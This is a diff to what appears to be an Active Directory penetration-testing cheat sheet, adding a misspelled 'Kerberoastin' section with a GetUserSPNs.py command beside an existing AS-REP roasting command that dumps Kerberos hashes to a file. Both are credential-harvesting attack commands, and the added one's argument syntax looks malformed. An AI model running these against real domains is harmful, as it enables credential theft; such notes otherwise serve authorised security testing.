@@ -75,6 +75,11 @@ ASREPRoasting
 ```
 GetNPUsers.py -dc-ip IP domain.local/user -outputfile hashes.asreproast
 ```
+Kerberoastin
+
+```
+GetUserSPNs.py DC-IP\user:password
+```
 DRSUAPI
 
 ```
